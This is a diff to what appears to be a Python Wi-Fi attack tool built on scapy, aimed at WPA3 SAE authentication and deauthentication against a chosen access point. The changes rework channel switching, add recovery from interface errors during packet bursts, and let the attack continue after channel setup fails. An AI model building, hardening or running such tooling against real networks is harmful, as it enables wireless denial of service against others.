@@ -202,17 +202,31 @@ def validate_sae_hex_lists():
         sys.exit(1)
 
 def set_channel_scientific(interface: str, channel: str) -> bool:
-    """Robust channel switching with hardware stabilization delay"""
-    for cmd in [['iw', 'dev', interface, 'set', 'channel', str(channel)],
-                ['iwconfig', interface, 'channel', str(channel)]]:
-        try:
-            if subprocess.run(cmd, capture_output=True, timeout=2).returncode == 0:
-                time.sleep(0.15)  # Hardware settle time per Linux wireless docs
-                return True
-        except Exception:
-            pass
-    logger.warning(f"[CHANNEL] Failed to set channel {channel} on {interface}")
-    return False
+    subprocess.run(['ip', 'link', 'set', interface, 'up'], capture_output=True)
+    time.sleep(0.1)
+
+    try:
+        info = subprocess.run(['iw', 'dev', interface, 'info'], capture_output=True, text=True, timeout=2)
+        phy_num = None
+        for line in info.stdout.splitlines():
+            if line.strip().startswith('wiphy'):
+                phy_num = line.strip().split()[1]
+                break
+        if not phy_num:
+            logger.warning(f"[CHANNEL] No phy for {interface}")
+            return False
+        phy = f"phy{phy_num}"
+    except Exception as e:
+        logger.warning(f"[CHANNEL] Phy lookup failed: {e}")
+        return False
+
+    result = subprocess.run(['iw', 'phy', phy, 'set', 'channel', str(channel)], capture_output=True, timeout=2)
+    if result.returncode == 0:
+        time.sleep(0.3)
+        return True
+    else:
+        logger.warning(f"[CHANNEL] iw phy {phy} set channel {channel} failed: {result.stderr.decode().strip()}")
+        return False
 
 def send_burst_scientific(packet_list: list, interface: str, counter: Value):
     """Paper-aligned burst sending with precise timing & atomic counting"""
@@ -235,8 +249,16 @@ def send_burst_scientific(packet_list: list, interface: str, counter: Value):
         with counter.get_lock():
             counter.value += len(batch)
     except Exception as e:
-        logger.warning(f"[SEND] Buffer/Drop error on {interface}: {e}")
-        time.sleep(0.1)
+        error_msg = str(e)
+        if "No such device" in error_msg or "19" in error_msg:
+            logger.error(f"[HARDWARE ERROR] {interface} has disappeared! (USB-Reset?) Pause for 5 seconds...")
+            time.sleep(5)
+        elif "Network is down" in error_msg or "100" in error_msg:
+            subprocess.run(['ip', 'link', 'set', interface, 'up'], capture_output=True)
+            time.sleep(0.1)
+        else:
+            logger.warning(f"[SEND] Buffer/Drop error on {interface}: {e}")
+            time.sleep(0.1)
 
 # =====================================================================================
 # ======================== SCANNER FUNCTIONS (VERSION 2 IMPROVED) =====================
@@ -324,8 +346,7 @@ def run_attacker_process(interface, bssid, channel, band, attack_type, scalar_he
     from scapy.all import RandMAC, Dot11, RadioTap, Dot11Auth, Dot11Deauth, sendp
 
     if not set_channel_scientific(interface, channel):
-        logger.error(f"[ATTACK] {interface}: Channel setup failed")
-        return
+        logger.warning(f"[ATTACK] {interface}: Channel setup warning, try it anyway...")
 
 # Decode & validate SAE lists safely as PAIRS
     try:
@@ -445,7 +466,7 @@ def cleanup(procs, scanner_proc=None):
 
 def signal_handler(sig, frame):
     logger.info("[SIGNAL] Interrupt received, graceful shutdown...")
-    sys.exit(0)
+    os._exit(0)
 
 # =====================================================================================
 # ======================== MAIN ORCHESTRATOR ==========================================
